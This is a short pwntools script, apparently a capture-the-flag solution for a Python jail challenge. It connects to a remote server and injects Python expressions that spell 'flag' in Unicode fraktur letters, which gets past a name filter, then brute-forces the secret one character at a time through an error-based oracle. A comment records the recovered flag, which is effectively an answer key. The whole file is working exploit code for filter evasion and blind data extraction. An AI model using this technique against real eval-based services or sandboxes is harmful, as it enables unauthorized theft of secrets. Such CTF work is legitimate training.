from pwn import *
import string 


flag = ""
charset = string.printable
for i in range(100):
    for c in charset:
        # io = process(["python3", "py50.py"])
        io = remote("159.89.193.103", 9998)
        io.sendline(f"a if 𝔣𝔩𝔞𝔤[{len(flag)}]=='{c}' else 0")
        # if io.recvline()
        try: 
            print(io.recvline())
            flag += c
            break
        except:
            pass
        io.close()
    print(flag)

    # CJ{d8bf5e4e9439ffb274130cb509a87f7a}